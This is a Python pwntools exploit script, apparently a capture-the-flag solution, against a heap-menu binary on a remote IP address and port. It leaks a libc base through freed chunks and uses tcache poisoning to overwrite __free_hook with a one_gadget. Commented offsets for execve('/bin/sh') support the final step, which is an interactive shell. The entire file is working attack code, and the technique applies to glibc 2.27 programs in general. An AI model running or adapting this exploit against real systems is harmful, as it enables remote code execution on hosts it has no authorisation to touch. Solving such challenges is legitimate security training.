from pwn import *


# f = process("./task2")
f = remote("40.71.72.198", 1235)
ELF_libc = ELF("libc-2.27.so")

def malloc(idx, size, content):
	f.sendlineafter(">> ", "1")
	f.sendlineafter(">> ", str(idx))
	f.sendlineafter(">> ", str(size))
	f.sendlineafter(">> ", str(content))

def free(idx):
	f.sendlineafter(">> ", "2")
	f.sendlineafter(">> ", str(idx))

def edit(idx, content):
	f.sendlineafter(">> ", "3")
	f.sendlineafter(">> ", str(idx))
	f.sendlineafter(">> ", str(content))

def show(idx):
	f.sendlineafter(">> ", "4")
	f.sendlineafter(">> ", str(idx))




if len(sys.argv) > 2:
	gdb.attach(f, "c")

for i in range(10):
	malloc(i, 143, "")

for i in range(9):
	free(i)



show(7)
leak = f.recvline().strip()
leak = leak.ljust(8, "\x00")
leak = u64(leak)
libc = leak - 4111520 # main_arena
log.info("libc base @ " + hex(libc))
target = libc+ELF_libc.symbols['__free_hook']
log.info("__free_hook @ " + hex(target))
one_shot = libc + 0x4f432

# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL


malloc(10, 8, "")
malloc(11, 8, "")
free(10)
free(11)
edit(11, p64(target).replace("\x00", ""))
malloc(12, 8, "")
malloc(13, 8, p64(one_shot).replace("\x00", ""))
free(12)

f.interactive()